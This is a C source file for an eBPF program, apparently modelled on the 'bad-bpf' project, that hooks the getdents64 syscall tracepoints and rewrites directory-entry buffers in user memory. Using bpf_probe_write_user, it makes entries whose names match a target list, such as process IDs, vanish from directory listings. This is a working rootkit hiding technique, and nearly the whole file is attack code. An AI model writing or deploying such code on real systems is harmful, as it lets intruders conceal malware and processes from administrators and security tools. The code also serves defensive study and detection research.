/*
 *  Credit for inspiration goes to github.com/pathtofile, see pathtofile/bad-bpf
 */

/*
 *  All unnecessary variables, questionable loops and other poor practices are 
 *  necessitated by the joys of the eBPF load-time verifier and the LLVM eBPF compiler.
 */

#include "vmlinux.h"
#include "hide.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>


char LICENSE[] SEC("license") = "GPL";

//map for userspace dirent64 buffers
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, u64);
    __type(value, u64);
} map_dirent_bufs SEC(".maps");


//map for target d_names to hide
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 8); //already allocated in ARRAY type, hence small number
    __type(key, u32);
    __type(value, struct target_d_name);
} map_d_name_tgts SEC(".maps");



//hook getdents64 to store PID and dirents buffer address of caller
SEC("tracepoint/syscalls/sys_enter_getdents64")
int BPF_getdents64_enter(struct trace_event_raw_sys_enter * arg) {

    //get pid & tgid, stored in same 64bit int
    u64 pid_tgid = bpf_get_current_pid_tgid();

    //get dirent buffer
    struct linux_dirent64 * direntp = (struct linux_dirent64 *) arg->args[1];
    if (direntp == NULL) {
        bpf_printk("\n[enter] FATAL ERROR: direntp is null on entry\n");
        //bpf_printk("\n%s\n", PADDING); //convince compiler to leave in the padding
        return 0;
    }

    bpf_map_update_elem(&map_dirent_bufs, &pid_tgid, &direntp, BPF_ANY);

    return 0;
}


//check return dirents buffer for entry matching PID to block
SEC("tracepoint/syscalls/sys_exit_getdents64")
int BPF_getdents64_exit(struct trace_event_raw_sys_exit * arg) {

    s64 ret = 0;

    //get pid & tgid, stored in same 64bit int
    u64 pid_tgid = bpf_get_current_pid_tgid();

    //get bytes read during syscall
    u64 r_bytes = arg->ret;
    if (r_bytes == 0) return 0;

    //check if the buffer for this PID is known
    u64 * bufp = bpf_map_lookup_elem(&map_dirent_bufs, &pid_tgid);
    if (bufp == NULL) return 0;

    //setup scanning dirent buffers
    struct linux_dirent64 * direntp;
    struct linux_dirent64 * direntp_last;

    //setup dirent lengths
    u16 d_reclen = 0;
    u16 d_reclen_last = 0;
    u16 d_reclen_new = 0;

    //setup dirent buffer offsets
    u32 buf_offset = 0;
    u32 buf_offset_last = 0;

    //iterator derivatives
    u32 tgt_index = 0;

    //setup misc
    char filename[PID_LEN_MAX];
    
    //NOTE: loop has to be finite to satisfy eBPF verifier
    //iterate through all structurs in the return buffer looking for the pid
    for (int i = 0; i < 512; i++) {
       
        //if trying to read past end of buffer, exit loop
        if (buf_offset >= r_bytes) {
            break;
        }

        //get next dirent & extract its size and name from userspace
        direntp = (struct linux_dirent64 *) (*bufp + buf_offset);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &direntp->d_reclen);
        ret = bpf_probe_read_user(&filename, PID_LEN_MAX, direntp->d_name);


        //for every filename we're looking to hide
        for (u32 j = 0; j < PID_NAME_ENTRIES; j++) {

            tgt_index = j; //preserve j, otherwise we get an inf. loop

            //get next hide entry
            struct target_d_name * current_d_name
                = bpf_map_lookup_elem(&map_d_name_tgts, &tgt_index);
            if (current_d_name == NULL) return -1;

            //compare current d_entry with the fetched hide_entry
            u16 k = 0;

            //for every character in target filename
            for (k = 0; (k < current_d_name->len) && (k < PID_LEN_MAX); k++) {
                if (filename[k] != current_d_name->name[k]) break;
            }

            //if match found
            if (k == current_d_name->len) {

                //if this is the first dirent in directory, can't hide it so skip
                if (buf_offset == 0) continue;
 
                //get previous dirent
                direntp_last = (struct linux_dirent64 *) (*bufp + buf_offset_last);
                bpf_probe_read_user(&d_reclen_last, sizeof(d_reclen_last), 
                                    &direntp_last->d_reclen);

                //make last dirent overwrite current dirent to hide this entry
                d_reclen_new = d_reclen_last + d_reclen;
                bpf_probe_write_user(&direntp_last->d_reclen, &d_reclen_new,
                                     sizeof(d_reclen_new));

                //remove dirent entry from the map
                bpf_map_delete_elem(&map_dirent_bufs, &pid_tgid);
            } //end if match found
        } //end for every filename we're looking to find

        buf_offset_last = buf_offset;
        buf_offset += d_reclen;
    
    } //end for each dirent

    //clean up entries for this pid_tgid since ebpf is exiting
    bpf_map_delete_elem(&map_dirent_bufs, &pid_tgid);

    return 0;
}
